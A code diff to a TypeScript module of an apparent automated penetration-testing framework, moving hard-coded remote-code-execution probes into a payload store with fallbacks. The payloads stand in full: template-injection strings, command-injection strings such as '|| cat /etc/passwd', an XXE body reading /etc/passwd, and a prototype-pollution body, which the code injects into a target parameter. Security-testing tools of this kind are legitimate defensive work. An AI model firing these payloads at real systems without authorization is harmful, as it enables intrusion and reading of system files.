@@ -23,12 +23,7 @@ import type {
 } from './framework'
 import { claimFor } from './framework'
 import { EvidenceGate } from '../intelligence/evidence-gate'
-
-const SSTI_PAYLOADS = ['${{7*7}}', "{{7*'7'}}", '<%= 7*7 %>']
-const CMD_PAYLOADS = ['; id', '| whoami', '$(id)', '|| cat /etc/passwd']
-const XXE_BODY =
-  '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'
-const PROTO_BODY = JSON.stringify({ __proto__: { polluted: 'yes' } })
+import { getPayloadStore } from '../payloads/store'
 
 /** Pick the parameter name to inject into. */
 function paramName(ctx: TechniqueContext, method: string): string {
@@ -59,8 +54,13 @@ export const rceClass: TechniquePrimitive = {
     const sep = baseUrl.includes('?') ? '&' : '?'
     const steps: AttackStep[] = []
 
+    const sstiPayloads = getPayloadStore().getPayloads('ssti/generic') || ['${{7*7}}', "{{7*'7'}}", '<%= 7*7 %>']
+    const cmdPayloads = getPayloadStore().getPayloads('command-injection/unix', 'unix') || ['; id', '| whoami', '$(id)', '|| cat /etc/passwd']
+    const xxeBody = (getPayloadStore().getPayloads('xxe/oob') || ['<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'])[0]
+    const protoBody = (getPayloadStore().getPayloads('prototype-pollution/client') || [JSON.stringify({ __proto__: { polluted: 'yes' } })])[0]
+
     // 1. SSTI — template-injection probes via the target param.
-    for (const p of SSTI_PAYLOADS) {
+    for (const p of sstiPayloads) {
       const url =
         method === 'GET'
           ? `${baseUrl}${sep}${param}=${encodeURIComponent(p)}`
@@ -81,7 +81,7 @@ export const rceClass: TechniquePrimitive = {
     }
 
     // 2. CMD — OS command injection via the target param.
-    for (const p of CMD_PAYLOADS) {
+    for (const p of cmdPayloads) {
       const url =
         method === 'GET'
           ? `${baseUrl}${sep}${param}=${encodeURIComponent(p)}`
@@ -109,7 +109,7 @@ export const rceClass: TechniquePrimitive = {
         method: 'POST',
         url: baseUrl,
         headers: { ...sessionHeaders, 'content-type': 'application/json' },
-        body: PROTO_BODY,
+        body: protoBody,
       },
       expectedSignal: 'injected "polluted" marker controllable',
       metadata: { kind: 'proto', payload: '__proto__' },
@@ -130,7 +130,7 @@ export const rceClass: TechniquePrimitive = {
         method: 'POST',
         url: baseUrl,
         headers: { ...sessionHeaders, 'content-type': 'application/xml' },
-        body: XXE_BODY,
+        body: xxeBody,
       },
       expectedSignal: 'response echoes root: / /bin/ (file contents)',
       metadata: { kind: 'xxe', payload: 'xxe' },
